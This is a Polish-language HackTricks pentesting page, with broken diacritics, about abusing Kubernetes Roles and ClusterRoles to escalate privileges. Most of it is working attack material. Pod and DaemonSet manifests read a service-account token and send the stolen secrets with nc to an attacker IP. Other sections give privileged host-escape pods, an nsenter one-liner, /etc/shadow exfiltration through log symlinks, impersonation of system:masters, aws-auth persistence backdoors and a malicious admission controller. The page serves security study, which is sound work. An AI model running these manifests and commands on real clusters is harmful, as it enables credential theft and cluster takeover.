# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub.**

</details>

Tutaj znajdziesz niekt贸re potencjalnie niebezpieczne konfiguracje r贸l i ClusterRoles.\
Pamitaj, 偶e mo偶esz uzyska wszystkie obsugiwane zasoby za pomoc `kubectl api-resources`

## **Eskalacja uprawnie**

M贸wic o zdolnoci **uzyskania dostpu do innego podmiotu** w klastrze **z innymi uprawnieniami** (wewntrz klastra Kubernetes lub do zewntrznych chmur), w Kubernetes istniej g贸wnie **4 g贸wne techniki eskalacji uprawnie**:

* Mo偶liwo **udawania** innego u偶ytkownika/grupy/SA z lepszymi uprawnieniami w klastrze Kubernetes lub do zewntrznych chmur
* Mo偶liwo **tworzenia/aktualizacji/wykonania pod贸w**, w kt贸rych mo偶na **znale藕 lub doczy SA** z lepszymi uprawnieniami w klastrze Kubernetes lub do zewntrznych chmur
* Mo偶liwo **odczytu tajemnic**, poniewa偶 tokeny SA s przechowywane jako tajemnice
* Mo偶liwo **ucieczki do wza** z kontenera, gdzie mo偶na ukra wszystkie tajemnice dziaajcych wz贸w, powiadczenia wza i uprawnienia wza w chmurze, w kt贸rej dziaa (jeli istniej)
* Pita technika, kt贸ra zasuguje na uwag, to mo偶liwo **uruchomienia port-forward** w podzie, poniewa偶 mo偶na uzyska dostp do interesujcych zasob贸w w tym podzie.

### Dostp do dowolnego zasobu lub czasownika (Wildcard)

**Znak wieloznaczny (\*) daje uprawnienia do dowolnego zasobu z dowolnym czasownikiem**. Jest u偶ywany przez administrator贸w. Wewntrz ClusterRole oznacza to, 偶e atakujcy mo偶e nadu偶ywa dowolnego namespace w klastrze.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### Uzyskaj dostp do dowolnego zasobu za pomoc okrelonego czasownika

W RBAC pewne uprawnienia stwarzaj znaczne ryzyko:

1. **`create`:** Udziela mo偶liwoci tworzenia dowolnego zasobu klastra, zwikszajc ryzyko eskalacji uprawnie.
2. **`list`:** Pozwala na wywietlanie wszystkich zasob贸w, potencjalnie ujawniajc wra偶liwe dane.
3. **`get`:** Umo偶liwia dostp do sekret贸w z kont usugowych, stanowic zagro偶enie dla bezpieczestwa.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Tworzenie Pod - Kradzie偶 Tokena

Atakujcy posiadajcy uprawnienia do tworzenia poda mo偶e doczy uprzywilejowane konto usugi do poda i ukra token, aby podszywa si pod to konto usugi. Efektywnie podnosi to uprawnienia do tego konta.

Przykad poda, kt贸ry ukra token konta usugi `bootstrap-signer` i wysa go do atakujcego:

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

### Tworzenie i ucieczka z kontenera

Poni偶ej przedstawiono wszystkie uprawnienia, jakie mo偶e mie kontener:

* **Dostp z uprawnieniami** (wyczanie zabezpiecze i ustawianie mo偶liwoci)
* **Wyczanie przestrzeni nazw hostIPC i hostPid**, kt贸re mog pom贸c w eskalacji uprawnie
* **Wyczanie przestrzeni nazw hostNetwork**, umo偶liwiajce kradzie偶 uprawnie chmury wz贸w i lepszy dostp do sieci
* **Montowanie / hosta wewntrz kontenera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Utw贸rz pod za pomoc:

```bash
kubectl --token $token create -f mount_root.yaml
```

Jednolinijkowiec z [tego tweeta](https://twitter.com/mauilion/status/1129468485480751104) z kilkoma dodatkami:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Teraz, gdy mo偶esz uciec do wza, sprawd藕 techniki post-eksploatacyjne w:

#### Stealth

Prawdopodobnie chcesz by bardziej **niezauwa偶alny**, na nastpnych stronach mo偶esz zobaczy, do czego bdziesz m贸g uzyska dostp, jeli utworzysz pod, wczajc tylko niekt贸re z wymienionych uprawnie w poprzednim szablonie:

* **Privileged + hostPID**
* **Tylko privileged**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Przykady konfiguracji uprzywilejowanych pod贸w mo偶na znale藕 w_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Tworzenie pod贸w - Przejd藕 do chmury

Jeli mo偶esz **utworzy** pod (i opcjonalnie konto **service account**), mo偶esz by w stanie **uzyska uprawnienia w rodowisku chmury**, przypisujc role chmury do poda lub konta service account, a nastpnie uzyska do niego dostp.\
Ponadto, jeli mo偶esz utworzy **pod z przestrzeni nazw sieci hosta**, mo偶esz **ukra rol IAM** instancji **wza**.

Aby uzyska wicej informacji, sprawd藕:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Tworzenie/Patchowanie Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

Mo偶na wykorzysta te uprawnienia do **utworzenia nowego poda** i uzyskania uprawnie, jak w poprzednim przykadzie.

Poni偶szy plik yaml **tworzy daemonset i wycieka token SA** do rodka poda:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

### **Wykonanie polece w kontenerach**

**`pods/exec`** to zas贸b w Kubernetes, kt贸ry su偶y do **wykonywania polece w powoce wewntrz kontenera**. Pozwala to na **wykonywanie polece wewntrz kontener贸w lub uzyskanie dostpu do powoki**.

Dlatego mo偶liwe jest **wejcie do kontenera i kradzie偶 tokena SA**, lub wejcie do uprzywilejowanego kontenera, ucieczka do wza i kradzie偶 wszystkich token贸w kontener贸w na w藕le oraz (nadu偶ywanie) wza:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

### port-forward

To uprawnienie umo偶liwia **przekierowanie jednego lokalnego portu na jeden port w okrelonym podzie**. Ma to na celu umo偶liwienie atwego debugowania aplikacji dziaajcych wewntrz poda, ale atakujcy mo偶e je wykorzysta do uzyskania dostpu do interesujcych (np. baz danych) lub podatnych aplikacji (np. strony internetowe) wewntrz poda:

```
kubectl port-forward pod/mypod 5000:5000
```

### Ucieczka z folderu /var/log/ z mo偶liwoci zapisu

Jak [**wskazano w tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), jeli masz dostp lub mo偶esz utworzy pod z zamontowanym katalogiem **`/var/log/` z hosta**, mo偶esz **uciec z kontenera**.\
Dzieje si tak, poniewa偶, gdy **Kube-API pr贸buje pobra logi** kontenera (u偶ywajc `kubectl logs <pod>`), 偶da pliku `0.log` poda za pomoc punktu kocowego `/logs/` usugi **Kubelet**.\
Usuga Kubelet udostpnia punkt kocowy `/logs/`, kt贸ry w zasadzie **eksponuje system plik贸w `/var/log` kontenera**.

Dlatego atakujcy majcy **dostp do zapisu w folderze /var/log/** kontenera mo偶e wykorzysta to zachowanie na 2 sposoby:

* Modyfikujc plik `0.log` swojego kontenera (zwykle znajdujcy si w `/var/logs/pods/namespace_pod_uid/container/0.log`) tak, aby by **symlinkiem wskazujcym na `/etc/shadow`** na przykad. Nastpnie bdziesz m贸g wydoby plik shadow hosta wykonujc:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* Jeli atakujcy kontroluje jakiekolwiek podmioty z uprawnieniami do odczytu `nodes/log`, mo偶e po prostu utworzy **symlink** w `/host-mounted/var/log/sym` do `/`, a nastpnie podczas **dostpu do `https://<gateway>:10250/logs/sym/` wywietli zawarto g贸wnego systemu plik贸w hosta** (zmiana symlinka mo偶e umo偶liwi dostp do plik贸w).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Laboratorium i automatyczny exploit mo偶na znale藕 na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Omijanie ochrony tylko do odczytu dla hostpath <a href="#omijanie-ochrony-tylko-do-odczytu-dla-hostpath" id="omijanie-ochrony-tylko-do-odczytu-dla-hostpath"></a>

Jeli masz szczcie i masz dostp do wysoko uprzywilejowanej mo偶liwoci `CAP_SYS_ADMIN`, mo偶esz po prostu ponownie zamontowa folder jako rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Omijanie ochrony hostPath readOnly <a href="#omijanie-ochrony-hostpath-readonly" id="omijanie-ochrony-hostpath-readonly"></a>

Jak stwierdzono w [**tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), mo偶liwe jest obejcie ochrony:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

To miao zapobiec ucieczkom podobnym do poprzednich, poprzez zamiast korzystania z monta偶u hostPath, u偶ywa PersistentVolume i PersistentVolumeClaim do zamontowania folderu hosta w kontenerze z dostpem do zapisu:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **Podszywanie si pod uprzywilejowane konta**

Z uprawnieniami do [**podrobienia u偶ytkownika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), atakujcy mo偶e podszy si pod uprzywilejowane konto.

Wystarczy u偶y parametru `--as=<nazwa_u偶ytkownika>` w poleceniu `kubectl`, aby podszy si pod u偶ytkownika, lub `--as-group=<grupa>` aby podszy si pod grup:

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```

Lub u偶yj interfejsu REST API:

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Wywietlanie sekret贸w

Uprawnienie do **wywietlania sekret贸w mo偶e umo偶liwi atakujcemu faktyczne odczytanie sekret贸w** poprzez dostp do punktu kocowego interfejsu API REST:

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Odczytywanie tajemnicy - amanie token贸w ID metod brute-force

Podczas gdy atakujcy posiadajcy token z uprawnieniami do odczytu wymaga dokadnej nazwy tajemnicy, aby jej u偶y, w przeciwiestwie do bardziej og贸lnych uprawnie _**listowania tajemnic**_, istniej nadal podatnoci. Domylne konta usug w systemie mog by wyliczane, zwizane z ka偶d tajemnic. Te tajemnice maj struktur nazwy: stay prefiks, a nastpnie losowy piciocyfrowy alfanumeryczny token (z wyczeniem pewnych znak贸w) zgodnie z [kodem 藕r贸dowym](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token jest generowany z ograniczonego zestawu 27 znak贸w (`bcdfghjklmnpqrstvwxz2456789`), a nie z penego zakresu alfanumerycznego. To ograniczenie zmniejsza cakowit liczb mo偶liwych kombinacji do 14 348 907 (27^5). W rezultacie atakujcy m贸gby wykona atak brute-force w celu odgadnicia tokenu w cigu kilku godzin, co potencjalnie prowadzioby do eskalacji uprawnie poprzez uzyskanie dostpu do wra偶liwych kont usugowych.

### 呕dania podpisywania certyfikat贸w

Jeli masz czasowniki **`create`** w zasobie `certificatesigningrequests` (lub przynajmniej w `certificatesigningrequests/nodeClient`), mo偶esz **utworzy** nowe 偶danie podpisania certyfikatu dla **nowego wza**.

Zgodnie z [dokumentacj, mo偶liwe jest automatyczne zatwierdzanie tych 偶da](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), wic w tym przypadku **nie potrzebujesz dodatkowych uprawnie**. Jeli nie, musisz mie mo偶liwo zatwierdzenia 偶dania, co oznacza aktualizacj w `certificatesigningrequests/approval` i `approve` w `signers` z resourceName `<signerNameDomain>/<signerNamePath>` lub `<signerNameDomain>/*`.

**Przykad roli** z wszystkimi wymaganymi uprawnieniami to:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

Wic, po zatwierdzeniu nowego CSR wza, mo偶na **nadu偶y** specjalnych uprawnie wz贸w do **kradzie偶y sekret贸w** i **eskalacji uprawnie**.

W [**tym pocie**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**tym**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) konfiguracja GKE K8s TLS Bootstrap jest skonfigurowana z **automatycznym podpisywaniem** i jest nadu偶ywana do generowania powiadcze nowego wza K8s, a nastpnie nadu偶ywana do eskalacji uprawnie poprzez kradzie偶 sekret贸w.\
Jeli **masz wspomniane uprawnienia, mo偶esz zrobi to samo**. Nale偶y zauwa偶y, 偶e pierwszy przykad omija bd uniemo偶liwiajcy nowemu wzowi dostp do sekret贸w wewntrz kontener贸w, poniewa偶 **wze mo偶e uzyska dostp tylko do sekret贸w kontener贸w zamontowanych na nim**.

Spos贸b na obejcie tego polega po prostu na **utworzeniu powiadcze wza dla nazwy wza, na kt贸rym zamontowany jest kontener z interesujcymi sekretami** (ale sprawd藕, jak to zrobi w pierwszym pocie):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

Podmioty, kt贸re mog modyfikowa **`configmaps`** w przestrzeni nazw kube-system na klastrach EKS (musz znajdowa si w AWS), mog uzyska uprawnienia administratora klastra, nadpisujc configmap **aws-auth**.\
Potrzebne s czasowniki **`update`** i **`patch`**, lub **`create`** jeli configmapa nie zostaa jeszcze utworzona:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Mo偶esz u偶y **`aws-auth`** do **trwaego** dostpu dla u偶ytkownik贸w z **innych kont**.

Jednak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nie dziaa z innego konta**. Ale tak naprawd `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` dziaa, jeli podasz ARN klastra zamiast samej nazwy.\
Aby `kubectl` dziaa, upewnij si, 偶e **skonfigurujesz** **kubeconfig ofiary** i w argumentach aws exec dodaj `--profile other_account_role`, aby kubectl u偶ywa profilu innego konta do pobrania tokena i skontaktowania si z AWS.
{% endhint %}

### Eskalacja w GKE

Istniej **2 sposoby przypisywania uprawnie K8s do podmiot贸w GCP**. W ka偶dym przypadku podmiot musi mie r贸wnie偶 uprawnienie **`container.clusters.get`**, aby m贸c uzyska powiadczenia dostpu do klastra, lub bdziesz musia **wygenerowa wasny plik konfiguracyjny kubectl** (postpuj zgodnie z nastpnym linkiem).

{% hint style="warning" %}
Podczas rozmowy z punktem kocowym API K8s zostanie wysany **token uwierzytelniajcy GCP**. Nastpnie GCP, za porednictwem punktu kocowego API K8s, najpierw **sprawdzi, czy podmiot** (na podstawie adresu e-mail) **ma dostp do klastra**, a nastpnie sprawdzi, czy ma **dostp za porednictwem GCP IAM**.\
Jeli **kt贸rekolwiek** z tych warunk贸w jest **prawdziwe**, zostanie udzielona odpowied藕. Jeli **nie**, zostanie wywietlony bd sugerujcy udzielenie **uprawnie za porednictwem GCP IAM**.
{% endhint %}

Pierwsza metoda polega na u偶yciu **GCP IAM**, uprawnienia K8s maj swoje **odpowiednie uprawnienia GCP IAM**, i jeli podmiot je posiada, bdzie m贸g z nich skorzysta.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Druga metoda polega na **przypisaniu uprawnie K8s wewntrz klastra** do identyfikacji u偶ytkownika na podstawie jego **adresu e-mail** (w tym konta usug GCP).

### Tworzenie token贸w dla kont usugowych

Podmioty, kt贸re mog **tworzy 偶dania token贸w** (`serviceaccounts/token`) podczas rozmowy z punktem kocowym API K8s SAs (informacje z [**tutaj**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Podmioty, kt贸re mog **`aktualizowa`** lub **`modyfikowa`** **`pods/ephemeralcontainers`**, mog uzyska **wykonanie kodu na innych podach** i potencjalnie **przej** do swojego wza, dodajc tymczasowy kontener z uprzywilejowanym securityContext.

### ValidatingWebhookConfigurations lub MutatingWebhookConfigurations

Podmioty posiadajce dowolne z czasownik贸w `create`, `update` lub `patch` nad `validatingwebhookconfigurations` lub `mutatingwebhookconfigurations` mog by w stanie **utworzy jedn z takich webhookconfigurations**, aby m贸c **eskalowa uprawnienia**.

Przykad [`mutatingwebhookconfigurations znajdziesz w tej sekcji tego posta`](./#malicious-admission-controller).

### Eskalacja

Jak mo偶esz przeczyta w nastpnej sekcji: [**Wbudowana zapobieganie eskalacji uprawnie**](./#built-in-privileged-escalation-prevention), podmiot nie mo偶e aktualizowa ani tworzy r贸l ani clusterroles bez posiadania tych nowych uprawnie. Chyba 偶e ma czasownik `escalate` nad `roles` lub `clusterroles`.\
Wtedy mo偶e aktualizowa/tworzy nowe role, clusterroles z lepszymi uprawnieniami ni偶 te, kt贸re posiada.

### Proxy wz贸w

Podmioty z dostpem do podzasobu **`nodes/proxy`** mog **wykonywa kod na podach** za porednictwem interfejsu API Kubelet (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Wicej informacji na temat uwierzytelniania Kubelet znajdziesz na tej stronie:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Przykad, jak uzyska [**RCE rozmawiajc z autoryzacj z interfejsem API Kubelet, znajdziesz tutaj**](../pentesting-kubernetes-services/#kubelet-rce).

### Usuwanie pod贸w + wzy niedopuszczalne

Podmioty, kt贸re mog **usuwa pody** (czasownik `delete` nad zasobem `pods`), lub **wysuwa pody** (czasownik `create` nad zasobem `pods/eviction`), lub **zmienia status poda** (dostp do `pods/status`) i mog **uniemo偶liwi planowanie innych wz贸w** (dostp do `nodes/status`) lub **usuwa wzy** (czasownik `delete` nad zasobem `nodes`) i maj kontrol nad podem, mog **ukra pody z innych wz贸w**, aby byy **wykonywane** na **skompromitowanym** **w藕le**, a atakujcy mo偶e **ukra tokeny** z tych pod贸w.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usug (CVE-2020-8554)

Podmioty, kt贸re mog **modyfikowa** **`services/status`**, mog ustawi pole `status.loadBalancer.ingress.ip` w celu wykorzystania **niezaatanej luki CVE-2020-8554** i przeprowadzenia atak贸w **MiTM na klaster**. Wikszo agodze dla CVE-2020-8554 dotyczy tylko usug ExternalIP (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status wz贸w i pod贸w

Podmioty posiadajce uprawnienia **`update`** lub **`patch`** do `nodes/status` lub `pods/status` mog modyfikowa etykiety w celu wpywania na narzucone ograniczenia planowania.

## Wbudowana zapobieganie eskalacji uprawnie

Kubernetes posiada [wbudowany mechanizm](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping), kt贸ry zapobiega eskalacji uprawnie.

Ten system zapewnia, 偶e **u偶ytkownicy nie mog podnosi swoich uprawnie poprzez modyfikacj r贸l lub powiza r贸l**. Egzekwowanie tej reguy odbywa si na poziomie interfejsu API, zapewniajc zabezpieczenie nawet wtedy, gdy autoryzator RBAC jest nieaktywny.

Regua okrela, 偶e **u偶ytkownik mo偶e tworzy lub aktualizowa rol tylko wtedy, gdy posiada wszystkie uprawnienia, z kt贸rych skada si rola**. Ponadto, zakres istniejcych uprawnie u偶ytkownika musi by zgodny z zakresem roli, kt贸r pr贸buje utworzy lub zmodyfikowa: albo og贸lnoklastrowy dla ClusterRoles, albo ograniczony do tej samej przestrzeni nazw (lub og贸lnoklastrowy) dla Roles.

{% hint style="warning" %}
Istnieje wyjtek od poprzedniej reguy. Jeli podmiot ma **czasownik `escalate`** dla **`roles`** lub **`clusterroles`**, mo偶e zwikszy uprawnienia r贸l i clusterroles nawet bez posiadania tych uprawnie.
{% endhint %}

### **Pobierz i zmie RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Wczeniej ta technika dziaaa, ale wedug moich test贸w ju偶 nie dziaa z tego samego powodu, co wyjaniono w poprzedniej sekcji. Nie mo偶esz tworzy/modyfikowa rolebinding, aby nada sobie lub innemu SA pewne uprawnienia, jeli ich nie masz ju偶.**
{% endhint %}

Uprawnienie do tworzenia Rolebindings umo偶liwia u偶ytkownikowi **powizanie r贸l z kontem usugi**. To uprawnienie mo偶e potencjalnie prowadzi do eskalacji uprawnie, poniewa偶 **umo偶liwia u偶ytkownikowi powizanie uprawnie administratora z skompromitowanym kontem usugi.**

## Inne ataki

### Aplikacja proxy sidecar

Domylnie nie ma 偶adnego szyfrowania w komunikacji midzy podami. Autoryzacja wzajemna, dwukierunkowa, pod do podu.

#### Utw贸rz aplikacj proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Utw贸rz plik .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edytuj sw贸j plik .yaml i dodaj odkomentowane linie:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Zobacz dzienniki proxy:

```bash
kubectl logs app -C proxy
```

Wicej informacji na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zoliwy kontroler przyjcia

Kontroler przyjcia **przechwytuje 偶dania do serwera API Kubernetes** przed trwaoci obiektu, ale **po uwierzytelnieniu** **i autoryzacji** 偶dania.

Jeli atakujcy w jaki spos贸b zdoa **wstrzykn kontroler przyjcia mutacji**, bdzie m贸g **modyfikowa ju偶 uwierzytelnione 偶dania**. To pozwala na potencjalne podniesienie uprawnie i zazwyczaj na trwae pozostanie w klastrze.

**Przykad z** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Sprawd藕 status, aby zobaczy, czy jest gotowy:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Nastpnie wdro偶 nowy pod:

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Kiedy widzisz bd `ErrImagePull`, sprawd藕 nazw obrazu za pomoc jednego z poni偶szych zapyta:

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

